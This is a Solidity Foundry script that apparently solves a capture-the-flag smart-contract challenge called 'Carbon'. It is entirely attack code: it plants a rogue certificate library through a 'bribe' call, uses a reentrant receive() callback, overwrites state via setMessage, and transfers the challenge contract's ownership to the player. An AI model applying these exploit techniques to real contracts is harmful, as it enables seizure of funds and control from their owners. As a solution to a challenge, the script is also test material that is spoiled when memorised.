pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Carbon} from "../src/Carbon.sol";
import {Setup} from "../src/Setup.sol";

contract Solve is Script {
	Carbon carbon;
	Setup setup;
	MyCertificateLibrary thelib;
	
	function setUp() public {
		setup = Setup(vm.envAddress("SETUP"));
		carbon = Carbon(vm.envAddress("CHAL"));
	}

	function run() public {
		vm.startBroadcast(vm.envUint("PRIV"));
		thelib = new MyCertificateLibrary();
		new Briber{value: 1 ether}(carbon, address(thelib));
		Attack a = new Attack(vm.envAddress("PLAYER"), carbon);
		address(a).call{value: 0.2 ether + 3 wei}("");
		a.attack();
		console.log("Solved:", setup.isSolved());
	}

	fallback() external payable {}
}

contract MyCertificateLibrary {
	address parent;
	mapping(address => uint80) certificateId;
	
	function engraveCertificate(address person, uint256 identifier) public {
		certificateId[address(uint160(identifier))] = 0;
	}
}

contract Briber {
	constructor(Carbon carbon, address lib) payable {
		carbon.bribe{value: 1 ether}(lib);
	}
}

contract Attack {
	Carbon carbon;
	address myOwner;
	bool init;
	constructor(address o, Carbon _carbon) payable {
		myOwner = o;
		carbon = _carbon;
	}

	function attack() external {
		carbon.setMessage(uint256(uint160(carbon.owner())));
		carbon.claimCertificate(address(this));
		carbon.transferOwnership(myOwner);
	}

	receive() external payable {
		if (init) {
			carbon.receieve{value: 1 wei}();
		} else {
			carbon.receieve{value: msg.value - 2 wei}();
		}
		init = true;
	}
}
